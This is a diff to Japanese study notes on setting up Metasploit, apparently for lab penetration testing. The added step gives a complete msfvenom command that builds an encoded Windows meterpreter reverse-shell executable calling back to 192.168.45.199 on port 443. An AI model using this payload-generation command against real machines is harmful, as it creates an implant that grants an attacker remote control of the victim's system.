@@ -46,6 +46,11 @@ MSFはDBとしてPostgreSQLを使う。
 sudo msfdb init
 ```
 
+3. Windows用のリバースシェルバイナリを生成する(2)
+```
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.199 LPORT=443 -f exe -a x64 --platform windows -b '\x00' -e x64/xor_dynamic -o reverse.exe
+```
+
 #### msfconsole
 
 1. msfconsoleによってMetasploitのCLIを起動する。
